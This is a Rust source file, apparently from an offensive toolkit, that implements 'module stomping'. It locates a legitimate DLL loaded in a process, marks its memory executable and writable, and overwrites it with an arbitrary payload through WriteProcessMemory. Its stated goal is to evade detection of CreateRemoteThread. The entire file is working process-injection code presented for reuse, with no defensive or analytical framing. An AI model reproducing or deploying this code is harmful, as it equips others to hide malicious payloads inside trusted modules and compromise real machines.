// Module Stomping
// Overwrites legitimate DLL memory with payload to avoid CreateRemoteThread

use std::ffi::CString;
use std::ptr;
use winapi::shared::minwindef::*;
use winapi::um::errhandlingapi::*;
use winapi::um::libloaderapi::*;
use winapi::um::memoryapi::*;
use winapi::um::processthreadsapi::*;
use winapi::um::winnt::*;

/// Find a legitimate DLL in target process
pub unsafe fn find_legitimate_dll(
    process_handle: HANDLE,
    dll_name: &str,
) -> Result<*mut winapi::ctypes::c_void, String> {
    // Use CreateToolhelp32Snapshot to enumerate modules
    use winapi::um::tlhelp32::*;

    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, 0);
    if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
        return Err(format!("Failed to create snapshot: {}", GetLastError()));
    }

    let mut module_entry = MODULEENTRY32 {
        dwSize: std::mem::size_of::<MODULEENTRY32>() as u32,
        ..Default::default()
    };

    if Module32First(snapshot, &mut module_entry) == 0 {
        winapi::um::handleapi::CloseHandle(snapshot);
        return Err("Failed to get first module".to_string());
    }

    let target_name = CString::new(dll_name).unwrap();

    loop {
        let entry_name =
            std::ffi::CStr::from_ptr(module_entry.szModule.as_ptr() as *const i8).to_string_lossy();

        if entry_name.to_lowercase() == dll_name.to_lowercase() {
            winapi::um::handleapi::CloseHandle(snapshot);
            return Ok(module_entry.modBaseAddr);
        }

        if Module32Next(snapshot, &mut module_entry) == 0 {
            break;
        }
    }

    winapi::um::handleapi::CloseHandle(snapshot);
    Err(format!("DLL '{}' not found", dll_name))
}

/// Stomp module with payload
pub unsafe fn stomp_module(
    process_handle: HANDLE,
    dll_base: *mut winapi::ctypes::c_void,
    payload_data: &[u8],
) -> Result<(), String> {
    // Change memory protection
    let mut old_protect = 0u32;
    if VirtualProtectEx(
        process_handle,
        dll_base,
        payload_data.len(),
        PAGE_EXECUTE_READWRITE,
        &mut old_protect,
    ) == 0
    {
        return Err(format!(
            "Failed to change memory protection: {}",
            GetLastError()
        ));
    }

    // Write payload to DLL memory
    let mut bytes_written = 0usize;
    if WriteProcessMemory(
        process_handle,
        dll_base,
        payload_data.as_ptr() as *const winapi::ctypes::c_void,
        payload_data.len(),
        &mut bytes_written,
    ) == 0
    {
        return Err(format!("Failed to write payload: {}", GetLastError()));
    }

    if bytes_written != payload_data.len() {
        return Err(format!(
            "Partial write: {}/{} bytes",
            bytes_written,
            payload_data.len()
        ));
    }

    // Restore protection
    let mut _dummy = 0u32;
    VirtualProtectEx(
        process_handle,
        dll_base,
        payload_data.len(),
        old_protect,
        &mut _dummy,
    );

    Ok(())
}

/// Complete module stomping workflow
pub unsafe fn module_stomp(
    process_handle: HANDLE,
    target_dll: &str,
    payload_data: &[u8],
) -> Result<(), String> {
    // Find DLL in process
    let dll_base = find_legitimate_dll(process_handle, target_dll)?;

    // Stomp DLL with payload
    stomp_module(process_handle, dll_base, payload_data)?;

    Ok(())
}
